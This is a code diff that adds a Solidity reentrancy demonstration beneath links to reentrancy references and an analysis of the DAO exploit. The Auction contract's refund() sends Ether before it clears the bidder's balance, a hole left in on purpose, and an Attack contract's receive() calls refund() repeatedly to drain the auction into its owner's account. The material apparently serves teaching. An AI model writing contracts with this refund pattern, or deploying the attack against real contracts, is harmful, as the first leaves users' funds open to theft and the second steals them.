@@ -4,3 +4,60 @@ https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/
 https://github.com/kadenzipfel/smart-contract-attack-vectors/blob/master/attacks/reentrancy.md
 
 https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract Auction is Ownable {
+    uint constant minBID = 0.01 ether;
+    mapping(address => uint) private bidders;
+
+    function bid() external payable {
+        require(msg.value >= minBID, "Bid is very small!");
+        bidders[msg.sender] += msg.value;
+    }
+
+    function getBalance() public view returns(uint balance) {
+        balance = address(this).balance;
+    }
+
+    function refund() external {
+        require(bidders[msg.sender] > minBID, "You have not bid!");
+        (bool success,) = (msg.sender).call{value: bidders[msg.sender]}("");
+        require(success, "Faild!");
+        bidders[msg.sender] = 0;
+    }
+
+    function withdraw() external onlyOwner {
+        payable(owner()).transfer(address(this).balance);
+    }
+}
+
+contract Attack is Ownable {
+    uint constant minBID = 0.01 ether;
+    Auction private _auction;
+
+    constructor(address auction_) {
+        _auction = Auction(auction_);
+    }
+
+    function doBid() external payable {
+        _auction.bid{value: minBID}();
+    }
+
+    function attack() external {
+        _auction.refund();
+    }
+
+    receive() external payable {
+        if(_auction.getBalance() >= minBID) {
+            _auction.refund();
+        }
+    }
+
+    function withdraw() external onlyOwner {
+        payable(owner()).transfer(address(this).balance);
+    }
+}
